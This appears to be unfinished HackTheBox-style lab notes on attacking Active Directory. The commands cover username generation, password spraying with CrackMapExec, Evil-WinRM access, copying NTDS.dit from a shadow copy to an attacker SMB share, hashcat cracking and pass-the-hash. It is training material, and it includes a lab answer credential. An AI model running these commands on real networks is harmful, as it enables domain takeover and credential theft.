# Attacking Active Directory & NTDS.dit

Here we will learn how we can extract credentials through the use of a `dictionary attack against AD accounts` and `dumping hashes` from the `NTDS.dit` file.

our target must be reachable over the network. This means it is highly likely that we will need to have a foothold established on the internal network to which the target is connected.

Here is the authentication process once a Windows system has been joined to the domain.

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Once a Windows system is joined to a domain, it will `no longer default to referencing the SAM database to validate logon requests`. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on.

To bruteforce our way into the network, we need to know patterns orgs can utilize when creating employee usernames ->

| Username Convention                 | Practical Example for Jane Jill Doe |
| ----------------------------------- | ----------------------------------- |
| `firstinitiallastname`              | jdoe                                |
| `firstinitialmiddleinitiallastname` | jjdoe                               |
| `firstnamelastname`                 | janedoe                             |
| `firstname.lastname`                | jane.doe                            |
| `lastname.firstname`                | doe.jane                            |
| `nickname`                          | doedoehacksstuff                    |

an same goes for the email -> `jdoe`@`inlanefreight.com`

Let's say we have some employees&#x20;

* Ben Williamson
* Bob Burgerstien
* Jim Stevenson

using the tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy), we can convert a list of real names into common username formats.

```shell-session
ElFelixi0@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 

ben
benwilliamson
ben.williamson
benwilli
benwill
<SNIP>
```

Once we have our list(s) prepared or discover the naming convention and some employee names, we can launch our attack against the target domain controller using a tool such as CrackMapExec.

```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

### Capturing NTDS.dit

`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information

**Connecting to a DC with Evil-WinRM**

Once we have our set of credentials we can try and connect to the DC

```shell-session
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

Once connected, we can check to see what privileges `bwilliamson` has.

```shell-session
*Evil-WinRM* PS C:\> net localgroup
```

To make a copy of the NTDS.dit file, we need local admin (`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights.

**Checking User Account Privileges including Domain**

```shell-session
*Evil-WinRM* PS C:\> net user bwilliamson
<SNIP>
Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
<SNIP>
```

This account has both Administrators and Domain Administrator rights which means we can do just about anything we want

We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the C: drive because NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location.

```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

Then to copy the file we need to create an SMB share on our attack host

We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Now `cmd.exe /c move` can be used to move the file from the target DC to the share on our attack host.

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

**Using cme to Capture NTDS.dit**

This is much more faster&#x20;

```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

### Cracking Hashes

Now we can copy the output of the attack and put every NT hash in a txt file to launch hashcat

```shell-session
ElFelixi0@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

`What if we are unsuccessful in cracking a hash?`

&#x20;We can still use hashes to attempt to authenticate with a system using a type of attack called `Pass-the-Hash` (`PtH`). A PtH attack takes advantage of the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm) to authenticate a user using a password hash. Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`

**Pass-the-Hash with Evil-WinRM Example**

```shell-session
ElFelixi0@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

_**On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)**_

```
./username-anarchy/username-anarchy -i listofpeaople.txt > lastusername.txt
```

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
crackmapexec smb 10.129.202.85 -u lastusername.txt -p fasttrack.txt
```

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
cjohnson:Welcome1212
```

Did not manage to finish this, will come back later ->

##
